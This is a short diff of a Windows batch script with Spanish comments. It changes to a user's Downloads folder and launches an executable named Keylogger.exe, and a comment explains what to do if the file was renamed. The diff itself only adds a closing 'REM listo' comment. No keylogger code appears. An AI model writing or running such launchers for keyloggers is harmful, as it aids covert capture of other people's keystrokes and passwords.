@@ -10,3 +10,5 @@ cd C:\Users\Usuario\Downloads
 REM si le cambiaron el nombre al keylogger entonces 
 REM ponen el nombre que le pusieron al ejecutable
 start Keylogger.exe
+
+REM listo
